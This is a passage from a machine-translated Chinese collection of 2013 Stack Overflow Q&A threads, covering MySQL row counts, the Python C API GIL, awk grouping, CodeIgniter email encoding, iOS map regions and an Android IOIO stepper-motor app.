注意：由于这是一个 SQL 问题，因此我在答案中省略了 PHP 代码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-17T00:40:03.987

下面的查询只会根据您的要求检查两行。 `mysql_num_rows`可以检查没有任何循环返回多少行。

```
$result = mysql_query("SELECT col1 FROM t1 WHERE ... LIMIT 2");
if (mysql_num_rows($result) == 2) { 
```

* * *

请避免使用`ext/mysql`并切换到`PDO`或`mysqli`如果可以。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-02-17T01:25:33.427

```
$result = mysql_query("SELECT COUNT(*) FROM table WHERE .......");

if(mysql_num_rows($result) > 1) 
{
 echo 'at least 2 rows';
}

else
{
 echo 'less than 2 rows';
} 
```

# python - PyEval_InitThreads 什么时候应该被调用？

> ID：14916815
> 
> 赞同：5
> 
> 时间：2013-02-17T00:38:27.280
> 
> 标签：python, c, python-3.x, python-c-api, python-c-extension

我对什么时候应该打电话有点困惑`PyEval_InitThreads`。一般来说，我知道`PyEval_InitThreads`每当使用非 Python 线程（即在扩展模块中产生的线程）时都必须调用它。

但是，我很困惑`PyEval_InitThreads`是嵌入 Python 解释器的 C 程序，还是导入 C 扩展模块的 Python 程序，或者两者兼而有之。

那么，如果我编写一个将在内部启动线程的 C 扩展模块，我是否需要`PyEval_InitThreads`在初始化模块时调用？

此外，`PyEval_InitThreads` [**隐式获取 Global Interpreter Lock**](http://docs.python.org/dev/c-api/init.html#PyEval_InitThreads)。所以在调用之后`PyEval_InitThreads`，大概 GIL 必须被*释放*，否则就会出现死锁。那么如何释放锁呢？阅读文档后，[**`PyEval_ReleaseLock()`**](http://docs.python.org/dev/c-api/init.html#PyEval_ReleaseLock)似乎是释放 GIL 的方式。但是，在实践中，如果我在 C 扩展模块中使用以下代码：

```
 PyEval_InitThreads();
   PyEval_ReleaseLock(); 
```

...然后在运行时 Python 中止：

```
Fatal Python error: drop_gil: GIL is not locked 
```

那么你如何在获得 GIL 后释放它`PyEval_InitThreads`呢？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-17T19:17:43.717

大多数应用程序根本不需要知道`PyEval_InitThreads()`。

唯一应该使用它的情况是，如果您的嵌入应用程序或扩展模块将从多个线程进行 Python C API 调用，而这些线程在 Python 之外*生成*。

不要调用`PyEval_ReleaseLock()`任何稍后将进行 Python C API 调用的线程（除非您在这些线程之前重新获取它）。在这种情况下，您应该真正使用`Py_BEGIN_ALLOW_THREADS`and`Py_END_ALLOW_THREADS`宏。

# html - IE中的浮动未正确对齐

> ID：14916817
> 
> 赞同：0
> 
> 时间：2013-02-17T00:39:07.813
> 
> 标签：html, css, wordpress, internet-explorer

我试图让我的 div 在 IE 中正确浮动。它们在 Chrome 和 Firefox 中看起来很棒，但 IE 会破坏代码。您可以在这里看到 jsfiddle：http: [//jsfiddle.net/vlyandra/kEm3R/](http://jsfiddle.net/vlyandra/kEm3R/)基本上，图像 div 没有与条目 div 水平对齐，并且底部的表格（尽管有最大宽度）没有调整大小. 生成帖子的代码如下：

```
<article id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
<div class="bordered centered">
    <p class="negative-margin alignleft header"><?php the_title(); ?></p><p class="negative-margin alignright date"><?php the_date(); ?></p><div style="clear:both;"></div>
    <?php if ( is_search() ) : // Only display Excerpts for Search ?>
        <div class="entry-summary">
            <?php the_excerpt(); ?>
        </div><!-- .entry-summary -->
    <?php else : ?>
        <div class="entry-content negative-margin">
            <?php if ( has_post_thumbnail() ):?>
            <div id="entry-left">
                <?php   $large_image_url = wp_get_attachment_image_src( get_post_thumbnail_id($post->ID), 'large');
                echo '<a href="' . $large_image_url[0] . '" title="' . the_title_attribute('echo=0') . '" >';
                echo get_the_post_thumbnail($post->ID, 'large'); 
                echo '</a>';?>
            </div>
            <div class="entry-right">
                <?php the_content( __( 'More <span class="meta-nav">&rarr;</span>', 'huckleberry' ) ); ?>
                <?php wp_link_pages( array( 'before' => '<div class="page-links">' . __( 'Pages:', 'huckleberry' ), 'after' => '</div>' ) ); ?>
            </div><div style="clear:both;"></div>
            <div class="entry-right">
                <table class="fixed-height fixed-width">
                    <tr>
                        <td class="valigned"><h3 class="date">Details</h3>
                            <?php the_field('details');?>
                        </td>
                        <td class="valigned">
                            <a href="<?php echo MultiPostThumbnails::get_post_thumbnail_url(get_post_type(), 'secondary-image');?>">
                                <?php if (class_exists('MultiPostThumbnails')) : MultiPostThumbnails::the_post_thumbnail(get_post_type(), 'secondary-image'); endif; ?>
                            </a>
                        </td>
                        <td class="valigned">
                            <a href="<?php echo MultiPostThumbnails::get_post_thumbnail_url(get_post_type(), 'tertiary-image');?>">
                                <?php if (class_exists('MultiPostThumbnails')) : MultiPostThumbnails::the_post_thumbnail(get_post_type(), 'tertiary-image'); endif; ?>
                            </a>
                        </td>
                        <td class="valigned">
                            <a href="<?php echo MultiPostThumbnails::get_post_thumbnail_url(get_post_type(), 'fourth-image');?>">
                                <?php if (class_exists('MultiPostThumbnails')) : MultiPostThumbnails::the_post_thumbnail(get_post_type(), 'fourth-image'); endif; ?>
                            </a>
                        </td>
                    </tr>
                </table>
            </div>
            <?php else : ?>
                <?php the_content( __( 'More <span class="meta-nav">&rarr;</span>', 'huckleberry' ) ); ?>
                <?php wp_link_pages( array( 'before' => '<div class="page-links">' . __( 'Pages:', 'huckleberry' ), 'after' => '</div>' ) ); ?>
        </div>
            <?php endif; ?>
    <?php endif; ?> 
```

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-18T21:09:26.817

我没有看到它。您可以发送指向您网站的链接吗？

另外，您是否尝试过将 .alignleft 应用于图像？

# actionscript-3 - ActionScript 3 goto and play 事件不起作用

> ID：14916819
> 
> 赞同：0
> 
> 时间：2013-02-17T00:39:19.040
> 
> 标签：actionscript-3, flash, mouseevent

我有一个导航，在导航影片剪辑中，我有按钮，我把这段代码放在我的按钮框架中

```
aboutbtn.addEventListener(MouseEvent.CLICK,goAbout);
function goAbout(e:MouseEvent){
    this.gotoAndPlay('245');
} 
```

但这不起作用，当我单击按钮时它什么也不做，我的代码有问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T00:47:00.247

```
this.gotoAndPlay('245'); 
```

`'245'`是一个字符串并`gotoAndPlay`解释为一个框架标签。删除引号，传递一个整数，转到第 245 帧。

```
aboutbtn.addEventListener(MouseEvent.CLICK,goAbout);
function goAbout(e:MouseEvent){
    this.gotoAndPlay(245);
} 
```

如果这仍然不起作用，请确保`this`引用要更改帧的影片剪辑。例如，如果这段代码在文档类中，引用根实例，这将改变舞台的框架。

`SimpleButton`如果要更改按钮框架（仅在它是实例时才有意义），例如更改`this`为`aboutbtn`。

如果是别的什么，你会给我们更多的上下文，它可能是其他东西的负载（不同的阶段？是否有帧 245？是否启用了按钮鼠标？对象顶部是否有任何不可见的按钮？） .

编辑：

澄清后：如果你想改变*上面* `nav`对象的框架，它的父级，使用：

```
aboutbtn.addEventListener(MouseEvent.CLICK,goAbout);
function goAbout(e:MouseEvent){
    MovieClip(parent).gotoAndPlay(245);
} 
```

# node.js - 从 Node.js 0.6 升级到 0.8 是否会为 Web 应用程序带来一些重大优势？

> ID：14916822
> 
> 赞同：0
> 
> 时间：2013-02-17T00:39:31.013
> 
> 标签：node.js, upgrade

我们的网站是基于 Node.js 0.6 构建的，我们现在正在考虑如果将其升级到 0.8 是否会有一些显着的好处（我们希望保持我们的技术最新，但这会花费我们一些时间，所以我们需要考虑专业人士和谨慎的缺点）。

我进行了一些研究，但发现似乎“仅”类似于 API 清理——除此之外，似乎 0.6 和 0.8 分支都应该相对没有错误，而且现在人们似乎都在生产中使用它们。那么，我错过了什么重要的东西吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T00:46:09.417

[性能](http://www.nodejs-news.com/nodejs-tech/nodejs-0.8-perf/)随着版本 0.8 的增加而提高，并且比 0.6 更稳定

# unix - awk/Unix 分组

> ID：14916826
> 
> 赞同：45
> 
> 时间：2013-02-17T00:40:31.640
> 
> 标签：unix, awk

有这个文本文件：

```
name, age
joe,42
jim,20
bob,15
mike,24
mike,15
mike,54
bob,21 
```

试图得到这个（计数）：

```
joe 1
jim 1
bob 2
mike 3 
```

谢谢，

* * *

## 回答 #1

> 赞同：105
> 
> 时间：2013-02-17T00:50:24.927

```
$ awk -F, 'NR>1{arr[$1]++}END{for (a in arr) print a, arr[a]}' file.txt
joe 1
jim 1
mike 3
bob 2 
```

## 解释

*   `-F,`分裂`,`
*   `NR>1`处理第 1 行之后的行
*   `arr[$1]++`以第一列为键递增数组`arr`（用 拆分）`,`
*   `END{}`块在处理文件结束时执行
*   `for (a in arr)``arr`用`a`key迭代
*   `print a`用键打印键`, arr[a]`数组`a`

* * *

## 回答 #2

> 赞同：28
> 
> 时间：2013-02-17T00:44:27.650

剥离标题行，删除年龄字段，将相同的名称组合在一起（排序），计算相同的运行次数，以所需的格式输出。

```
tail -n +2 txt.txt | cut -d',' -f 1 | sort | uniq -c | awk '{ print $2, $1 }' 
```

输出

```
bob 2
jim 1
joe 1
mike 3 
```

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2013-02-17T01:50:39.317

看起来你想要排序的输出。您可以简单地通过管道或打印到`sort -nk 2`：

```
awk -F, 'NR>1 { a[$1]++ } END { for (i in a) print i, a[i] | "sort -nk 2" }' file 
```

结果：

```
jim 1
joe 1
bob 2
mike 3 
```

* * *

但是，如果您已`GNU awk`安装，则可以在没有 coreutils 的情况下执行排序。这是将数组按其值排序的单进程解决方案。解决方案仍然应该很快。像这样运行：

```
awk -f script.awk file 
```

内容`script.awk`：

```
BEGIN {
    FS=","
}

NR>1 {
    a[$1]++
}

END {
    for (i in a) {
        b[a[i],i] = i
    }

    n = asorti(b)

    for (i=1;i<=n;i++) {
        split (b[i], c, SUBSEP)
        d[++x] = c[2]
    }

    for (j=1;j<=n;j++) {
        print d[j], a[d[j]]
    }
} 
```

结果：

```
jim 1
joe 1
bob 2
mike 3 
```

或者，这是单线：

```
awk -F, 'NR>1 { a[$1]++ } END { for (i in a) b[a[i],i] = i; n = asorti(b); for (i=1;i<=n;i++) { split (b[i], c, SUBSEP); d[++x] = c[2] } for (j=1;j<=n;j++) print d[j], a[d[j]] }' file 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2013-02-17T00:49:13.563

严格的 awk 解决方案...

```
BEGIN { FS = "," }
{ ++x[$1] }
END { for(i in x) print i, x[i] } 
```

如果`name, age`确实在文件中，您可以调整 awk 程序以忽略它...

```
BEGIN   { FS = "," }
/[0-9]/ { ++x[$1] }
END     { for(i in x) print i, x[i] } 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-06-29T08:54:12.777

我根据此处的答案提出了两个功能：

```
topcpu() {
    top -b -n1                                                                                  \
        | tail -n +8                                                                            \
        | awk '{ print $12, $9, $10 }'                                                          \
        | awk '{ CPU[$1] += $2; MEM[$1] += $3 } END { for (k in CPU) print k, CPU[k], MEM[k] }' \
        | sort -k3 -n                                                                           \
        | tail -n 10                                                                            \
        | column -t                                                                             \
        | tac
}

topmem() {
    top -b -n1                                                                                  \
        | tail -n +8                                                                            \
        | awk '{ print $12, $9, $10 }'                                                          \
        | awk '{ CPU[$1] += $2; MEM[$1] += $3 } END { for (k in CPU) print k, CPU[k], MEM[k] }' \
        | sort -k2 -n                                                                           \
        | tail -n 10                                                                            \
        | column -t                                                                             \
        | tac
} 
```

```
$ topcpu
chrome           0    75.6
gnome-shell      6.2  7
mysqld           0    4.2
zsh              0    2.2
deluge-gtk       0    2.1
Xorg             0    1.6
scrcpy           0    1.6
gnome-session-b  0    0.8
systemd-journal  0    0.7
ibus-x11         6.2  0.7

$ topmem
top              12.5  0
Xorg             6.2   1.6
ibus-x11         6.2   0.7
gnome-shell      6.2   7
chrome           6.2   74.6
adb              6.2   0.1
zsh              0     2.2
xdg-permission-  0     0.2
xdg-document-po  0     0.1
xdg-desktop-por  0     0.4 
```

请享用！

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-11-25T17:14:55.403

猫文件.txt | 剪切-d',' -f 1 | 排序 | 唯一的-c

```
2 bob
1 jim
1 joe
3 mike 
```

# javascript - 如何下载使用 javascript 动态生成的文件列表？

> ID：14916827
> 
> 赞同：0
> 
> 时间：2013-02-17T00:41:11.870
> 
> 标签：javascript, url, for-loop

我正在尝试创建并循环通过指向动态生成的 XML 文件的链接列表。

这是我正在使用的代码。. . 我更改了网址：

```
 function scanSystem() {
    // Starting value for scans
        var xMin = '0';
        var yMin = '0';
    // Temporary - The highest coordinates that will be scanned
        var coordMax = '19';

        for (var x = xMin; x <= coordMax; x++) {
            for (var y = yMin; y <= coordMax; y++) {
                var url = "http://www.xmlurl.com/members/scanners/list.php?cockpit&xml&x=" + x + "&y="+ y;
                var link = "<a href='" + url + "'>(" + x + "," + y + ")</a><br>";
                $("#links_container").append(link);
                document.getElementById('iframe').src = url;
            }
        }
    } 
```

链接生成并填充 div（目前更多的是调试功能），但实际上只有最后一个链接是通过 iframe 下载的。

任何想法如何使它也开始下载其他文件？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T00:57:25.707

A way to do it is to dynamically create a hidden `iframe` for each link instead of opening new windows (which will be annoying). Each iframe will be loading each file individually.

Taking advantage that you are using jQuery already, here's sample code:

```
function scanSystem() {
  var x
    , y
    , coordMax = 19
    , url
    , linksContainer = $("#links_container")
    ;

  for (x = 0; x <= coordMax; x++) {
    for (y = 0; y <= coordMax; y++) {

      url = 'http://www.xmlurl.com/members/scanners/list.php?cockpit&xml&x=' + x + '&y=' + y;
      $('<a/>',{
          href : url
        })
        .text(x+','+y)
        .appendTo(linksContainer);

      $('<iframe/>',{
          src : url
        })
        .appendTo('body');
    }
  }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-17T00:49:15.647

无需在 iframe 中打开 URL，只需使用`window.open`. 如果只下载一个文件，大多数浏览器会立即关闭新窗口。

# iphone - 可以知道 CLLocation 点是否在 MKCoordinateRegion 中？

> ID：14916830
> 
> 赞同：2
> 
> 时间：2013-02-17T00:41:28.900
> 
> 标签：iphone, ios, mkmapview, cllocation, mkcoordinateregion

我有一个 CLLocation 点（纬度/经度），我想知道它是否在确定的 MKCoordinateRegion 中。我想知道之前在哪个区域创建了 CLLocation 点。

谢谢。

**我找到了解决方案。**

```
MKCoordinateRegion region = self.mapView.region;

CLLocationCoordinate2D location = user.gpsposition.coordinate;
CLLocationCoordinate2D center   = region.center;
CLLocationCoordinate2D northWestCorner, southEastCorner;

northWestCorner.latitude  = center.latitude  - (region.span.latitudeDelta  / 2.0);
northWestCorner.longitude = center.longitude - (region.span.longitudeDelta / 2.0);
southEastCorner.latitude  = center.latitude  + (region.span.latitudeDelta  / 2.0);
southEastCorner.longitude = center.longitude + (region.span.longitudeDelta / 2.0);

if (
    location.latitude  >= northWestCorner.latitude && 
    location.latitude  <= southEastCorner.latitude &&

    location.longitude >= northWestCorner.longitude && 
    location.longitude <= southEastCorner.longitude
    )
{
    // User location (location) in the region - OK :-)
    NSLog(@"Center (%f, %f) span (%f, %f) user: (%f, %f)| IN!", region.center.latitude, region.center.longitude, region.span.latitudeDelta, region.span.longitudeDelta, location.latitude, location.longitude);

}else {

    // User location (location) out of the region - NOT ok :-(
    NSLog(@"Center (%f, %f) span (%f, %f) user: (%f, %f)| OUT!", region.center.latitude, region.center.longitude, region.span.latitudeDelta, region.span.longitudeDelta, location.latitude, location.longitude);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T00:47:38.210

有类似的问题。回答正确 -[如何在不使用 MKMapView 的情况下检查 MKCoordinateRegion 是否包含 CLLocationCoordinate2D？](https://stackoverflow.com/questions/10553072/how-to-check-if-mkcoordinateregion-contains-cllocationcoordinate2d-without-using)

祝你好运 ：）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-01-31T17:04:53.707

这似乎是正确的，但倒退了。区域西北角的纬度将大于中心，因为随着您向北移动，纬度会增加。经度是正确的。所以这里计算的角是交换的，northwestCorner实际上是西南角，seasternCorner实际上是东北角。但是代码有效，因为 if 语句也是向后的。它应该更像

```
CLLocationCoordinate2D newMapCenter = self.mapView.centerCoordinate;
CLLocationCoordinate2D startingCenter = self.startingRegion.center;
CLLocationCoordinate2D northWestCorner, southEastCorner;

northWestCorner.latitude = startingCenter.latitude + (self.startingRegion.span.latitudeDelta / 2.0);
northWestCorner.longitude = startingCenter.longitude - (self.startingRegion.span.longitudeDelta / 2.0);
southEastCorner.latitude = startingCenter.latitude - (self.startingRegion.span.latitudeDelta / 2.0);
southEastCorner.longitude = startingCenter.longitude + (self.startingRegion.span.longitudeDelta / 2.0);

if (newMapCenter.latitude <= northWestCorner.latitude && newMapCenter.latitude >= southEastCorner.latitude && newMapCenter.longitude >= northWestCorner.longitude && newMapCenter.longitude <= southEastCorner.longitude) {
    // still in original region
    NSLog(@"same region");
}
else
{
    // new region
    NSLog(@"new region");
} 
```

所以答案是对的，但也是错的。但它有效，所以我想它更正确。

# php - codeigniter html电子邮件更改字符

> ID：14916834
> 
> 赞同：4
> 
> 时间：2013-02-17T00:42:17.527
> 
> 标签：php, codeigniter, html-email

我的电子邮件有问题，html 没问题，但是当我打开它们时，文本和链接中有错误，其中一些字符更改为 = like

```
Thanks for joining . your log=n details are here ma=e sure you keep them safe.
To verify your email address, please follow this link:

 Finish your registration...

Link doesn't work? Copy the following link to your browser address bar:  http://www.myurl.com/dev=l/panel/auth/activate/123131/123131

Please verify your email within 123131 hours, otherwise your registration =ill become invalid and you will have to register again. 
```

每个图像和链接甚至文本都被破坏了我在想它与{unwrap}有关但没有帮助

这是 config/email.php

```
$config['email_notification']['protocol'] = 'smtp';
$config['email_notification']['smtp_host'] = 'smtp.live.com';
$config['email_notification']['smtp_user'] = 'xxxxx';
$config['email_notification']['smtp_pass'] = 'xxxxxxx';
$config['email_notification']['smtp_port'] = '587';
$config['email_notification']['mailtype'] = 'html';
$config['email_notification']['charset'] = 'utf-8';
$config['email_notification']['wordwrap'] = false;
$config['email_notification']['smtp_crypto'] = 'tls'; 
```

这是控制器

```
 $this->load->library('email');

    $this->email->initialize($this->config->item('email_notification'));
    $this->email->subject('Email Test');

    $this->email->set_newline("\r\n");
    $this->email->from('xxxxxx'); // change it to yours
    $this->email->to('xxxxx');
    $this->email->subject('Email Test');

    $data=array(
        'site_name'=>'tralalalal',
        'user_id'=>'123131',
        'new_email_key'=>'123131',
        'activation_period'=>'123131',
        'email'=>'123131',
        'title'=>'123131',

    );
    $this->email->message($this->load->view('email/activate_account/en',$data,true)); 
```

电子邮件正文是

```
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head>
<style type="text/css">
    /* Client-specific Styles */
#outlook a{padding:0;} /* Force Outlook to provide a "view in browser" button. */
body{width:100% !important;} .ReadMsgBody{width:100%;} .ExternalClass{width:100%;} /* Force Hotmail to display emails at full width */
body{-webkit-text-size-adjust:none;} /* Prevent Webkit platforms from changing default text sizes. */

    /* Reset Styles */
body{margin:0; padding:0;}
img{border:0; height:auto; line-height:100%; outline:none; text-decoration:none;}
table td{border-collapse:collapse;}
#backgroundTable{height:100% !important; margin:0; padding:0; width:100% !important;}
</style>
</head>
<body> 
```

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T01:13:06.053

我找到了答案，所以如果有人有同样的问题

这就是为什么

> 该标准对一行中的字符数有两个限制。每行字符必须不超过
> 998 个字符，并且应该不超过 78 个字符，不包括
> CRLF。
> 
> 998 个字符的限制是由于在发送、接收或存储 Internet 消息格式消息的许多实现中的限制，这些消息根本无法在一行中处理超过 998 个字符。为了健壮性，接收实现可以很好地处理一行中任意大量的字符。然而，有很多实现（符合 [RFC2821] 的传输要求）不接受包含超过 1000 个字符的消息，包括每行的 CR 和 LF，因此不创建此类消息对实现很重要。
> 
> 更保守的 78 个字符推荐是为了适应显示这些
> 消息的用户界面的许多实现，这些消息可能会截断或灾难性地换
> 行，每行超过 78 个字符的显示，尽管这样的
> 实现不符合本
> 规范的意图（以及 [RFC2821] 的意图，如果它们实际上导致
> 信息丢失）。同样，即使对消息施加了这种限制，它也依赖于显示消息的实现

这是您更改代码以覆盖此限制的地方 system/libraries/email.php

原版

```
protected function _prep_quoted_printable($str, $charlim = '')
{
    // Set the character limit
    // Don't allow over 76, as that will make servers and MUAs barf
    // all over quoted-printable data
    if ($charlim == '' OR $charlim > '76')
    {
        $charlim = '76';
    } 
```

快速解决 ：）

```
protected function _prep_quoted_printable($str, $charlim = '')
{
    // Set the character limit
    // Don't allow over 76, as that will make servers and MUAs barf
    // all over quoted-printable data
    if ($charlim == '' OR $charlim > '76')
    {
        $charlim = '200';
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-07-01T09:30:28.380

我认为问题出在 _prep_quoted_printable 函数中。幸运的是，从 v5.3 开始，这个函数有一个原生 PHP 版本

通过将电子邮件类中的 _prep_quoted_printable 实例替换为 PHP 本机函数quoted_printable_encode，我能够解决类似的问题。

这相当于我的 _build_message() 看起来像这样：

```
 /**
 * Build Final Body and attachments
 *
 * @access  protected
 * @return  void
 */
protected function _build_message()
{
    if ($this->wordwrap === TRUE  AND  $this->mailtype != 'html')
    {
        $this->_body = $this->word_wrap($this->_body);
    }

    $this->_set_boundaries();
    $this->_write_headers();

    $hdr = ($this->_get_protocol() == 'mail') ? $this->newline : '';
    $body = '';

    switch ($this->_get_content_type())
    {
        case 'plain' :

            $hdr .= "Content-Type: text/plain; charset=" . $this->charset . $this->newline;
            $hdr .= "Content-Transfer-Encoding: " . $this->_get_encoding();

            if ($this->_get_protocol() == 'mail')
            {
                $this->_header_str .= $hdr;
                $this->_finalbody = $this->_body;
            }
            else
            {
                $this->_finalbody = $hdr . $this->newline . $this->newline . $this->_body;
            }

            return;

        break;
        case 'html' :

            if ($this->send_multipart === FALSE)
            {
                $hdr .= "Content-Type: text/html; charset=" . $this->charset . $this->newline;
                $hdr .= "Content-Transfer-Encoding: quoted-printable";
            }
            else
            {
                $hdr .= "Content-Type: multipart/alternative; boundary=\"" . $this->_alt_boundary . "\"" . $this->newline . $this->newline;

                $body .= $this->_get_mime_message() . $this->newline . $this->newline;
                $body .= "--" . $this->_alt_boundary . $this->newline;

                $body .= "Content-Type: text/plain; charset=" . $this->charset . $this->newline;
                $body .= "Content-Transfer-Encoding: " . $this->_get_encoding() . $this->newline . $this->newline;
                $body .= $this->_get_alt_message() . $this->newline . $this->newline . "--" . $this->_alt_boundary . $this->newline;

                $body .= "Content-Type: text/html; charset=" . $this->charset . $this->newline;
                $body .= "Content-Transfer-Encoding: quoted-printable" . $this->newline . $this->newline;
            }

            // $this->_finalbody = $body . $this->_prep_quoted_printable($this->_body) . $this->newline . $this->newline;
            $this->_finalbody = $body . quoted_printable_encode($this->_body) . $this->newline . $this->newline;

            if ($this->_get_protocol() == 'mail')
            {
                $this->_header_str .= $hdr;
            }
            else
            {
                $this->_finalbody = $hdr . $this->_finalbody;
            }

            if ($this->send_multipart !== FALSE)
            {
                $this->_finalbody .= "--" . $this->_alt_boundary . "--";
            }

            return;

        break;
        case 'plain-attach' :

            $hdr .= "Content-Type: multipart/".$this->multipart."; boundary=\"" . $this->_atc_boundary."\"" . $this->newline . $this->newline;

            if ($this->_get_protocol() == 'mail')
            {
                $this->_header_str .= $hdr;
            }

            $body .= $this->_get_mime_message() . $this->newline . $this->newline;
            $body .= "--" . $this->_atc_boundary . $this->newline;

            $body .= "Content-Type: text/plain; charset=" . $this->charset . $this->newline;
            $body .= "Content-Transfer-Encoding: " . $this->_get_encoding() . $this->newline . $this->newline;

            $body .= $this->_body . $this->newline . $this->newline;

        break;
        case 'html-attach' :

            $hdr .= "Content-Type: multipart/".$this->multipart."; boundary=\"" . $this->_atc_boundary."\"" . $this->newline . $this->newline;

            if ($this->_get_protocol() == 'mail')
            {
                $this->_header_str .= $hdr;
            }

            $body .= $this->_get_mime_message() . $this->newline . $this->newline;
            $body .= "--" . $this->_atc_boundary . $this->newline;

            $body .= "Content-Type: multipart/alternative; boundary=\"" . $this->_alt_boundary . "\"" . $this->newline .$this->newline;
            $body .= "--" . $this->_alt_boundary . $this->newline;

            $body .= "Content-Type: text/plain; charset=" . $this->charset . $this->newline;
            $body .= "Content-Transfer-Encoding: " . $this->_get_encoding() . $this->newline . $this->newline;
            $body .= $this->_get_alt_message() . $this->newline . $this->newline . "--" . $this->_alt_boundary . $this->newline;

            $body .= "Content-Type: text/html; charset=" . $this->charset . $this->newline;
            $body .= "Content-Transfer-Encoding: quoted-printable" . $this->newline . $this->newline;

            // $body .= $this->_prep_quoted_printable($this->_body) . $this->newline . $this->newline;
            $body .= quoted_printable_encode($this->_body) . $this->newline . $this->newline;
            $body .= "--" . $this->_alt_boundary . "--" . $this->newline . $this->newline;

        break;
    }

    $attachment = array();

    $z = 0;

    for ($i=0; $i < count($this->_attach_name); $i++)
    {
        $filename = $this->_attach_name[$i];
        $basename = basename($filename);
        $ctype = $this->_attach_type[$i];

        if ( ! file_exists($filename))
        {
            $this->_set_error_message('lang:email_attachment_missing', $filename);
            return FALSE;
        }

        $h  = "--".$this->_atc_boundary.$this->newline;
        $h .= "Content-type: ".$ctype."; ";
        $h .= "name=\"".$basename."\"".$this->newline;
        $h .= "Content-Disposition: ".$this->_attach_disp[$i].";".$this->newline;
        $h .= "Content-Transfer-Encoding: base64".$this->newline;

        $attachment[$z++] = $h;
        $file = filesize($filename) +1;

        if ( ! $fp = fopen($filename, FOPEN_READ))
        {
            $this->_set_error_message('lang:email_attachment_unreadable', $filename);
            return FALSE;
        }

        $attachment[$z++] = chunk_split(base64_encode(fread($fp, $file)));
        fclose($fp);
    }

    $body .= implode($this->newline, $attachment).$this->newline."--".$this->_atc_boundary."--";

    if ($this->_get_protocol() == 'mail')
    {
        $this->_finalbody = $body;
    }
    else
    {
        $this->_finalbody = $hdr . $body;
    }

    return;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-08-02T23:46:47.357

有一个封闭的 Outlook 环境，不希望发送到另一个邮件客户端。

结果相似，但codeigniter版本不同。我有一个 wrapchars 变量来允许它改变。问题是它在 _prep_quoted_printable 中使用了硬编码的 76。我把76改成

```
 $this->wrapchars 
```

世界上的一切都变得美好。

# android - Android - IOIO - 步进电机控制 - 我应该使用服务......如果是这样如何实现？

> ID：14916835
> 
> 赞同：1
> 
> 时间：2013-02-17T00:42:30.373
> 
> 标签：android, service, binding, ioio

我在使用 IOIO 板控制步进电机时遇到了一些麻烦。我从 HelloIOIOPower 示例开始并添加了我的代码。当按下切换按钮时，程序将运行并打开/关闭 LED，但如果按下按钮改变 UI 线程中 motor_command 的值，则电机控制信号未设置，程序似乎挂起。它不会崩溃，但 LED 控制会丢失。

我尝试在 run 方法中的 switch 语句上使用 synchronized 以在允许更改 UI 线程中的 motor_control 之前评估整个 switch 语句。

我相信实现这一点的正确方法是绑定到 IOIO 线程，但我未能成功使其正常工作。

我希望能够更改“motor_control”的值，以创建对 IOIO 线程的控制命令以移动步进电机。一旦命令被执行，IOIO 线程将“motor_control”设置为零，这是一个注意或保持状态。

在服务中运行 IOIO 是首选但不是必需的。

我计划让这个应用程序 24/7 全天候运行，并向步进电机发送间歇性命令。当只有间歇性命令将发送到 IOIO 时，通过 IOIO 控制步进电机的正确方法是什么？

这是我在 Java/Android/IOIO 的第一次尝试，请随时指出所有错误，我很想了解我可以改进的地方......

谢谢...

` 包 com.medo.testmotor4;

```
import ioio.lib.api.DigitalOutput;
import ioio.lib.api.IOIO;
import ioio.lib.api.IOIOFactory;
import ioio.lib.api.exception.ConnectionLostException;
import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.ToggleButton;

public class TestMotor4 extends Activity {
/** The text displayed at the top of the page. */
private TextView title_;
/** The toggle button used to control the LED. */
private ToggleButton button_;

Button full;
Button half;
Button step16th;
Button cup;
Button dish;
TextView cup_count;
TextView random_num;
int traycount = 0;  // try cup position
int motor_command = 0;    //motor command index value for switch statement

/** The thread that interacts with the IOIO. */
private IOIOThread ioio_thread_;

/**
 * Called when the activity is first created. Here we normally initialize
 * our GUI.
 */
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_test_motor4);
    title_ = (TextView) findViewById(R.id.title);
    button_ = (ToggleButton) findViewById(R.id.button);

// Assign value to Text Views:
    cup_count = (TextView)findViewById(R.id.tv_cup_count);
    cup_count.setText(Integer.toString(traycount));

    random_num = (TextView)findViewById(R.id.tv_random_number);
    random_num.setText("no number");

    // Set up buttons
    dish = (Button) findViewById(R.id.btn_dish);
    dish.setOnClickListener(new View.OnClickListener(){

        @Override
        public void onClick(View arg0) {
            // call method that moves motor one full step
            motor_command = 4;      
            Toast.makeText(TestMotor4.this, "Motor_Command Set to: " + motor_command,Toast.LENGTH_SHORT).show();
        }
    });

    full = (Button) findViewById(R.id.btn_fullstep);
    full.setOnClickListener(new View.OnClickListener(){

        @Override
        public void onClick(View arg0) {
            // call method that moves motor one full step
            motor_command = 1;  
            Toast.makeText(TestMotor4.this, "Motor_Command Set to: " + motor_command,Toast.LENGTH_SHORT).show();
        }
    });

    cup = (Button) findViewById(R.id.btn_cup);
    cup.setOnClickListener(new View.OnClickListener(){

        @Override
        public void onClick(View arg0) {
            // call method that moves motor one full step
            traycount ++;
            if (traycount % 3 == 0 )    
                motor_command = 3;      // every 3rd tray cup move 54 1/8 steps 
